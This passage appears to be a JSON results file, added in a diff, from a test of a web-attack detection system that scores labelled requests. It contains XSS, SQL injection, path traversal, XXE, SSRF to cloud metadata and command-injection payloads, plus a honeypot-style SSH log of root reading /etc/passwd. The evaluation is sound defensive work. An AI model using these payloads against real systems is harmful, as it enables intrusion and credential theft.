+      "extra": "{\"score\": 24, \"signals\": [\"疑似XXE外部实体注入\", \"AI判定path_traversal(+0分): [body] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)\"], \"method\": \"POST\", \"path\": \"/api/preview\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 24, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"path_traversal\", \"is_attack\": true, \"attack_prob\": 0.8503, \"ai_points\": 0, \"confidence\": 0.99, \"high_risk\": false, \"reasons\": [\"[body] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)\"], \"signals\": [{\"field\": \"body\", \"value\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>\", \"attack_type\": \"path_traversal\", \"attack_prob\": 0.8503, \"ai_points\": 0, \"fusion_score\": 22, \"high_risk\": false, \"reason\": \"规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)\"}], \"model_label\": \"path_traversal\", \"source\": \"web\", \"ip\": \"192.0.2.*\", \"session_id\": \"a68093cc7f459145\", \"request_id\": \"\", \"latency_ms\": 29.993, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 0, \"ai_service_points\": 0, \"ai_input\": {\"path_length\": 12, \"query_length\": 0, \"body_length\": 95, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 262,
+      "timestamp": "2026-11-07 22:59:55",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "path_traversal_ai_detected",
+      "src_ip": "203.0.113.17",
+      "raw_request_id": 165,
+      "payload": "[AI判定path_traversal] POST /api/preview | [body] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)",
+      "extra": "{\"score\": 24, \"signals\": [\"疑似XXE外部实体注入\", \"AI判定path_traversal(+0分): [body] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)\"], \"method\": \"POST\", \"path\": \"/api/preview\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 24, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"path_traversal\", \"is_attack\": true, \"attack_prob\": 0.8503, \"ai_points\": 0, \"confidence\": 0.99, \"high_risk\": false, \"reasons\": [\"[body] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)\"], \"signals\": [{\"field\": \"body\", \"value\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>\", \"attack_type\": \"path_traversal\", \"attack_prob\": 0.8503, \"ai_points\": 0, \"fusion_score\": 22, \"high_risk\": false, \"reason\": \"规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)\"}], \"model_label\": \"path_traversal\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"b48e316ec7464e33\", \"request_id\": \"\", \"latency_ms\": 38.38, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 0, \"ai_service_points\": 0, \"ai_input\": {\"path_length\": 12, \"query_length\": 0, \"body_length\": 95, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    },
+    {
+      "id": 263,
+      "timestamp": "2026-11-07 22:59:56",
+      "source": "web",
+      "severity": "medium",
+      "event_type": "path_traversal_ai_detected",
+      "src_ip": "203.0.113.45",
+      "raw_request_id": 166,
+      "payload": "[AI判定path_traversal] POST /api/preview | [body] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)",
+      "extra": "{\"score\": 24, \"signals\": [\"疑似XXE外部实体注入\", \"AI判定path_traversal(+0分): [body] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)\"], \"method\": \"POST\", \"path\": \"/api/preview\", \"ua\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"rule\": {\"score\": 24, \"is_suspicious\": true}, \"ai\": {\"attack_type\": \"path_traversal\", \"is_attack\": true, \"attack_prob\": 0.8503, \"ai_points\": 0, \"confidence\": 0.99, \"high_risk\": false, \"reasons\": [\"[body] 规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)\"], \"signals\": [{\"field\": \"body\", \"value\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\">]><foo>&xxe;</foo>\", \"attack_type\": \"path_traversal\", \"attack_prob\": 0.8503, \"ai_points\": 0, \"fusion_score\": 22, \"high_risk\": false, \"reason\": \"规则命中 path_traversal(+22): 检测到 file:// 本地文件读取；sensitive_path(+20): 试图读取系统敏感文件 /etc/passwd；模型判定: xss(0.49)\"}], \"model_label\": \"path_traversal\", \"source\": \"web\", \"ip\": \"203.0.113.*\", \"session_id\": \"0f9ecdf3342cee43\", \"request_id\": \"\", \"latency_ms\": 17.417, \"model\": {\"version\": \"v2\", \"trained_at\": \"2026-10-22 18:49:38\", \"labels\": [\"xss\", \"sqli\", \"path_traversal\", \"sensitive_path\", \"normal\"]}}, \"ai_applied\": true, \"ai_points\": 0, \"ai_service_points\": 0, \"ai_input\": {\"path_length\": 12, \"query_length\": 0, \"body_length\": 95, \"user_agent_length\": 107}, \"ai_error\": \"\", \"ai_backoff_remaining_seconds\": 0.0, \"final_source\": \"rule+ai\"}"
+    }
+  ],
+  "details": [
+    {
+      "index": 1,
+      "family": "xss",
+      "label": "script 标签",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=<script>alert(document.cookie)</script>",
+      "ip": "203.0.113.17",
+      "status": 200,
+      "latency_ms": 140.4,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 133,
+      "threat_score": 47,
+      "is_suspicious": true,
+      "event_ids": [
+        233
+      ],
+      "event_types": [
+        "xss_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "xss"
+    },
+    {
+      "index": 2,
+      "family": "xss",
+      "label": "img onerror",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=<img src=x onerror=alert(1)>",
+      "ip": "203.0.113.45",
+      "status": 200,
+      "latency_ms": 155.2,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 134,
+      "threat_score": 47,
+      "is_suspicious": true,
+      "event_ids": [
+        234
+      ],
+      "event_types": [
+        "xss_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "xss"
+    },
+    {
+      "index": 3,
+      "family": "xss",
+      "label": "svg onload",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=<svg/onload=alert(1)>",
+      "ip": "203.0.113.99",
+      "status": 200,
+      "latency_ms": 123.8,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 135,
+      "threat_score": 47,
+      "is_suspicious": true,
+      "event_ids": [
+        235
+      ],
+      "event_types": [
+        "xss_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "xss"
+    },
+    {
+      "index": 4,
+      "family": "xss",
+      "label": "URL 编码",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "ip": "198.51.100.23",
+      "status": 200,
+      "latency_ms": 177.1,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 136,
+      "threat_score": 47,
+      "is_suspicious": true,
+      "event_ids": [
+        236
+      ],
+      "event_types": [
+        "xss_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "xss"
+    },
+    {
+      "index": 5,
+      "family": "xss",
+      "label": "javascript 伪协议",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=javascript:alert(1)//",
+      "ip": "198.51.100.77",
+      "status": 200,
+      "latency_ms": 153.4,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 137,
+      "threat_score": 47,
+      "is_suspicious": true,
+      "event_ids": [
+        237
+      ],
+      "event_types": [
+        "xss_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "xss"
+    },
+    {
+      "index": 6,
+      "family": "sqli",
+      "label": "UNION 查询",
+      "method": "GET",
+      "path": "/products",
+      "query": "id=1 UNION SELECT username,password FROM users",
+      "ip": "192.0.2.31",
+      "status": 200,
+      "latency_ms": 136.4,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 138,
+      "threat_score": 50,
+      "is_suspicious": true,
+      "event_ids": [
+        238
+      ],
+      "event_types": [
+        "sqli_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "sqli"
+    },
+    {
+      "index": 7,
+      "family": "sqli",
+      "label": "or 1=1",
+      "method": "GET",
+      "path": "/products",
+      "query": "id=1' OR '1'='1",
+      "ip": "192.0.2.88",
+      "status": 200,
+      "latency_ms": 173.0,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 139,
+      "threat_score": 50,
+      "is_suspicious": true,
+      "event_ids": [
+        239
+      ],
+      "event_types": [
+        "sqli_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "sqli"
+    },
+    {
+      "index": 8,
+      "family": "sqli",
+      "label": "注释截断",
+      "method": "GET",
+      "path": "/products",
+      "query": "id=admin'--",
+      "ip": "192.0.2.200",
+      "status": 200,
+      "latency_ms": 116.3,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 140,
+      "threat_score": 40,
+      "is_suspicious": true,
+      "event_ids": [
+        240
+      ],
+      "event_types": [
+        "sqli_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 23,
+      "ai_type": "sqli"
+    },
+    {
+      "index": 9,
+      "family": "sqli",
+      "label": "时间盲注",
+      "method": "GET",
+      "path": "/products",
+      "query": "id=1 AND SLEEP(5)",
+      "ip": "203.0.113.17",
+      "status": 200,
+      "latency_ms": 177.3,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 141,
+      "threat_score": 50,
+      "is_suspicious": true,
+      "event_ids": [
+        241
+      ],
+      "event_types": [
+        "sqli_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "sqli"
+    },
+    {
+      "index": 10,
+      "family": "sqli",
+      "label": "URL 编码",
+      "method": "GET",
+      "path": "/products",
+      "query": "id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users",
+      "ip": "203.0.113.45",
+      "status": 200,
+      "latency_ms": 91.4,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 142,
+      "threat_score": 50,
+      "is_suspicious": true,
+      "event_ids": [
+        242
+      ],
+      "event_types": [
+        "sqli_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "sqli"
+    },
+    {
+      "index": 11,
+      "family": "path_traversal",
+      "label": "etc/passwd",
+      "method": "GET",
+      "path": "/page",
+      "query": "file=../../../../etc/passwd",
+      "ip": "203.0.113.99",
+      "status": 500,
+      "latency_ms": 163.9,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 143,
+      "threat_score": 47,
+      "is_suspicious": true,
+      "event_ids": [
+        243
+      ],
+      "event_types": [
+        "path_traversal_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "path_traversal"
+    },
+    {
+      "index": 12,
+      "family": "path_traversal",
+      "label": "URL 编码",
+      "method": "GET",
+      "path": "/page",
+      "query": "file=..%2F..%2F..%2Fetc%2Fpasswd",
+      "ip": "198.51.100.23",
+      "status": 500,
+      "latency_ms": 165.5,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 144,
+      "threat_score": 47,
+      "is_suspicious": true,
+      "event_ids": [
+        244
+      ],
+      "event_types": [
+        "path_traversal_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "path_traversal"
+    },
+    {
+      "index": 13,
+      "family": "path_traversal",
+      "label": "Windows 路径",
+      "method": "GET",
+      "path": "/page",
+      "query": "file=..\\..\\..\\windows\\win.ini",
+      "ip": "198.51.100.77",
+      "status": 500,
+      "latency_ms": 143.8,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 145,
+      "threat_score": 47,
+      "is_suspicious": true,
+      "event_ids": [
+        245
+      ],
+      "event_types": [
+        "path_traversal_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "path_traversal"
+    },
+    {
+      "index": 14,
+      "family": "path_traversal",
+      "label": "绕过写法",
+      "method": "GET",
+      "path": "/page",
+      "query": "file=....//....//etc/passwd",
+      "ip": "192.0.2.31",
+      "status": 500,
+      "latency_ms": 138.4,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 146,
+      "threat_score": 47,
+      "is_suspicious": true,
+      "event_ids": [
+        246
+      ],
+      "event_types": [
+        "path_traversal_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "path_traversal"
+    },
+    {
+      "index": 15,
+      "family": "sensitive_path",
+      "label": ".env",
+      "method": "GET",
+      "path": "/.env",
+      "query": "",
+      "ip": "192.0.2.88",
+      "status": 403,
+      "latency_ms": 165.9,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 147,
+      "threat_score": 40,
+      "is_suspicious": true,
+      "event_ids": [
+        247
+      ],
+      "event_types": [
+        "sensitive_path_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "sensitive_path"
+    },
+    {
+      "index": 16,
+      "family": "sensitive_path",
+      "label": ".git/config",
+      "method": "GET",
+      "path": "/.git/config",
+      "query": "",
+      "ip": "192.0.2.200",
+      "status": 403,
+      "latency_ms": 132.2,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 148,
+      "threat_score": 55,
+      "is_suspicious": true,
+      "event_ids": [
+        248
+      ],
+      "event_types": [
+        "sensitive_path_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "sensitive_path"
+    },
+    {
+      "index": 17,
+      "family": "sensitive_path",
+      "label": "dump.sql",
+      "method": "GET",
+      "path": "/dump.sql",
+      "query": "",
+      "ip": "203.0.113.17",
+      "status": 403,
+      "latency_ms": 377.4,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 149,
+      "threat_score": 40,
+      "is_suspicious": true,
+      "event_ids": [
+        249
+      ],
+      "event_types": [
+        "sensitive_path_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "sensitive_path"
+    },
+    {
+      "index": 18,
+      "family": "sensitive_path",
+      "label": "备份包",
+      "method": "GET",
+      "path": "/backup.zip",
+      "query": "",
+      "ip": "203.0.113.45",
+      "status": 403,
+      "latency_ms": 431.9,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 150,
+      "threat_score": 40,
+      "is_suspicious": true,
+      "event_ids": [
+        250
+      ],
+      "event_types": [
+        "sensitive_path_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 25,
+      "ai_type": "sensitive_path"
+    },
+    {
+      "index": 19,
+      "family": "sensitive_path",
+      "label": "旧后台",
+      "method": "GET",
+      "path": "/admin_v2/login",
+      "query": "",
+      "ip": "203.0.113.99",
+      "status": 404,
+      "latency_ms": 147.6,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 151,
+      "threat_score": 15,
+      "is_suspicious": false
+    },
+    {
+      "index": 20,
+      "family": "scanner",
+      "label": "sqlmap UA",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "ip": "198.51.100.23",
+      "status": 200,
+      "latency_ms": 137.5,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 152,
+      "threat_score": 22,
+      "is_suspicious": true,
+      "event_ids": [
+        251
+      ],
+      "event_types": [
+        "scanner_probe"
+      ],
+      "final_source": "rule",
+      "ai_points": null,
+      "ai_type": null
+    },
+    {
+      "index": 21,
+      "family": "scanner",
+      "label": "Nikto UA",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "ip": "198.51.100.77",
+      "status": 200,
+      "latency_ms": 77.7,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 153,
+      "threat_score": 20,
+      "is_suspicious": true,
+      "event_ids": [
+        252
+      ],
+      "event_types": [
+        "scanner_probe"
+      ],
+      "final_source": "rule",
+      "ai_points": null,
+      "ai_type": null
+    },
+    {
+      "index": 22,
+      "family": "scanner",
+      "label": "Nmap UA",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "ip": "192.0.2.31",
+      "status": 200,
+      "latency_ms": 96.8,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 154,
+      "threat_score": 22,
+      "is_suspicious": true,
+      "event_ids": [
+        253
+      ],
+      "event_types": [
+        "scanner_probe"
+      ],
+      "final_source": "rule",
+      "ai_points": null,
+      "ai_type": null
+    },
+    {
+      "index": 23,
+      "family": "command_injection",
+      "label": "分号拼接",
+      "method": "GET",
+      "path": "/tools",
+      "query": "cmd=127.0.0.1;cat /etc/passwd",
+      "ip": "192.0.2.88",
+      "status": 404,
+      "latency_ms": 129.4,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 155,
+      "threat_score": 51,
+      "is_suspicious": true,
+      "event_ids": [
+        254
+      ],
+      "event_types": [
+        "sensitive_path_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 23,
+      "ai_type": "sensitive_path"
+    },
+    {
+      "index": 24,
+      "family": "command_injection",
+      "label": "$() 执行",
+      "method": "GET",
+      "path": "/tools",
+      "query": "cmd=$(whoami)",
+      "ip": "192.0.2.200",
+      "status": 404,
+      "latency_ms": 159.6,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 156,
+      "threat_score": 28,
+      "is_suspicious": true,
+      "event_ids": [
+        255
+      ],
+      "event_types": [
+        "webshell_probe"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 11,
+      "ai_type": "normal"
+    },
+    {
+      "index": 25,
+      "family": "command_injection",
+      "label": "管道",
+      "method": "GET",
+      "path": "/tools",
+      "query": "cmd=127.0.0.1|id",
+      "ip": "203.0.113.17",
+      "status": 404,
+      "latency_ms": 138.8,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 157,
+      "threat_score": 0,
+      "is_suspicious": false
+    },
+    {
+      "index": 26,
+      "family": "ssti",
+      "label": "双花括号",
+      "method": "GET",
+      "path": "/search",
+      "query": "name={{7*7}}",
+      "ip": "203.0.113.45",
+      "status": 200,
+      "latency_ms": 161.3,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 158,
+      "threat_score": 20,
+      "is_suspicious": true,
+      "event_ids": [
+        256
+      ],
+      "event_types": [
+        "ssti_probe"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 11,
+      "ai_type": "normal"
+    },
+    {
+      "index": 27,
+      "family": "ssti",
+      "label": "美元表达式",
+      "method": "GET",
+      "path": "/search",
+      "query": "name=${7*7}",
+      "ip": "203.0.113.99",
+      "status": 200,
+      "latency_ms": 160.7,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 159,
+      "threat_score": 40,
+      "is_suspicious": true,
+      "event_ids": [
+        257
+      ],
+      "event_types": [
+        "ssti_probe"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 11,
+      "ai_type": "normal"
+    },
+    {
+      "index": 28,
+      "family": "ssti",
+      "label": "JSP 表达式",
+      "method": "GET",
+      "path": "/search",
+      "query": "name=<%= 7*7 %>",
+      "ip": "198.51.100.23",
+      "status": 200,
+      "latency_ms": 169.1,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 160,
+      "threat_score": 0,
+      "is_suspicious": false
+    },
+    {
+      "index": 29,
+      "family": "ssrf",
+      "label": "云元数据",
+      "method": "GET",
+      "path": "/api/preview",
+      "query": "url=http://169.254.169.254/latest/meta-data/",
+      "ip": "198.51.100.77",
+      "status": 202,
+      "latency_ms": 2144.9,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 161,
+      "threat_score": 54,
+      "is_suspicious": true,
+      "event_ids": [
+        258
+      ],
+      "event_types": [
+        "sensitive_path_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 24,
+      "ai_type": "sensitive_path"
+    },
+    {
+      "index": 30,
+      "family": "ssrf",
+      "label": "file 协议",
+      "method": "GET",
+      "path": "/api/preview",
+      "query": "url=file:///etc/passwd",
+      "ip": "192.0.2.31",
+      "status": 202,
+      "latency_ms": 1415.6,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 162,
+      "threat_score": 20,
+      "is_suspicious": true,
+      "event_ids": [
+        259
+      ],
+      "event_types": [
+        "path_traversal_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 0,
+      "ai_type": "path_traversal"
+    },
+    {
+      "index": 31,
+      "family": "ssrf",
+      "label": "内网管理端",
+      "method": "GET",
+      "path": "/api/preview",
+      "query": "url=http://127.0.0.1:5001/",
+      "ip": "192.0.2.88",
+      "status": 202,
+      "latency_ms": 2058.4,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 163,
+      "threat_score": 30,
+      "is_suspicious": true,
+      "event_ids": [
+        260
+      ],
+      "event_types": [
+        "ssrf_probe"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 11,
+      "ai_type": "normal"
+    },
+    {
+      "index": 32,
+      "family": "xxe",
+      "label": "外部实体读取",
+      "method": "POST",
+      "path": "/api/preview",
+      "query": "",
+      "ip": "192.0.2.200",
+      "status": 400,
+      "latency_ms": 119.4,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 164,
+      "threat_score": 24,
+      "is_suspicious": true,
+      "event_ids": [
+        261
+      ],
+      "event_types": [
+        "path_traversal_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 0,
+      "ai_type": "path_traversal"
+    },
+    {
+      "index": 33,
+      "family": "xxe",
+      "label": "参数实体",
+      "method": "POST",
+      "path": "/api/preview",
+      "query": "",
+      "ip": "203.0.113.17",
+      "status": 400,
+      "latency_ms": 134.5,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 165,
+      "threat_score": 24,
+      "is_suspicious": true,
+      "event_ids": [
+        262
+      ],
+      "event_types": [
+        "path_traversal_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 0,
+      "ai_type": "path_traversal"
+    },
+    {
+      "index": 34,
+      "family": "xxe",
+      "label": "SYSTEM 关键字",
+      "method": "POST",
+      "path": "/api/preview",
+      "query": "",
+      "ip": "203.0.113.45",
+      "status": 400,
+      "latency_ms": 90.0,
+      "error": "",
+      "expected_attack": true,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 166,
+      "threat_score": 24,
+      "is_suspicious": true,
+      "event_ids": [
+        263
+      ],
+      "event_types": [
+        "path_traversal_ai_detected"
+      ],
+      "final_source": "rule+ai",
+      "ai_points": 0,
+      "ai_type": "path_traversal"
+    },
+    {
+      "index": 35,
+      "family": "benign",
+      "label": "首页",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "ip": "203.0.113.99",
+      "status": 200,
+      "latency_ms": 116.3,
+      "error": "",
+      "expected_attack": false,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 167,
+      "threat_score": 0,
+      "is_suspicious": false
+    },
+    {
+      "index": 36,
+      "family": "benign",
+      "label": "关于页",
+      "method": "GET",
+      "path": "/about",
+      "query": "",
+      "ip": "198.51.100.23",
+      "status": 200,
+      "latency_ms": 115.8,
+      "error": "",
+      "expected_attack": false,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 168,
+      "threat_score": 0,
+      "is_suspicious": false
+    },
+    {
+      "index": 37,
+      "family": "benign",
+      "label": "产品列表",
+      "method": "GET",
+      "path": "/products",
+      "query": "",
+      "ip": "198.51.100.77",
+      "status": 200,
+      "latency_ms": 112.9,
+      "error": "",
+      "expected_attack": false,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 169,
+      "threat_score": 0,
+      "is_suspicious": false
+    },
+    {
+      "index": 38,
+      "family": "benign",
+      "label": "新闻详情",
+      "method": "GET",
+      "path": "/news",
+      "query": "id=1",
+      "ip": "192.0.2.31",
+      "status": 200,
+      "latency_ms": 143.3,
+      "error": "",
+      "expected_attack": false,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 170,
+      "threat_score": 0,
+      "is_suspicious": false
+    },
+    {
+      "index": 39,
+      "family": "benign",
+      "label": "正常搜索",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=python+tutorial",
+      "ip": "192.0.2.88",
+      "status": 200,
+      "latency_ms": 140.4,
+      "error": "",
+      "expected_attack": false,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 171,
+      "threat_score": 0,
+      "is_suspicious": false
+    },
+    {
+      "index": 40,
+      "family": "benign",
+      "label": "方案页",
+      "method": "GET",
+      "path": "/solutions",
+      "query": "",
+      "ip": "192.0.2.200",
+      "status": 200,
+      "latency_ms": 93.1,
+      "error": "",
+      "expected_attack": false,
+      "marker": "ai_eval_20261107_225930",
+      "raw_request_id": 172,
+      "threat_score": 0,
+      "is_suspicious": false
+    }
+  ],
+  "ssh": [
+    {
+      "action": "login",
+      "status": "success"
+    },
+    {
+      "action": "cmd",
+      "command": "whoami",
+      "status": "ok",
+      "output_preview": "root\r\n"
+    },
+    {
+      "action": "cmd",
+      "command": "id",
+      "status": "ok",
+      "output_preview": "uid=0(root) gid=0(root) groups=0(root)\r\n"
+    },
+    {
+      "action": "cmd",
+      "command": "uname -a",
+      "status": "ok",
+      "output_preview": "Linux data-node-436c 6.8.0-57-generic #59-Ubuntu SMP PREEMPT_DYNAMIC Wed Mar 19 18:26:39 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\r\n"
+    },
+    {
+      "action": "cmd",
+      "command": "cat /etc/passwd",
+      "status": "ok",
+      "output_preview": "root:x:0:0:root:/root:/bin/bash\r\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\r\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\r\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\r\nsync:x:4:65534:sync:/bin:/bin/sync\r\ngames:"
+    },
+    {
+      "action": "cmd",
+      "command": "ls -la /root",
+      "status": "ok",
+      "output_preview": "total 30\r\ndrwxr-xr-x 2 root root  4096 Feb 10  2026 \u001b[01;34m.\u001b[0m\r\ndrwxr-xr-x 2 root root  4096 Mar 24  2025 \u001b[01;34m..\u001b[0m\r\n-rw-r--r-- 2 root root  6282 Apr 22  2025 .bash_history\r\n-rw-r--r-- 2 root "
+    },
+    {
+      "action": "cmd",
+      "command": "ps aux",
+      "status": "ok",
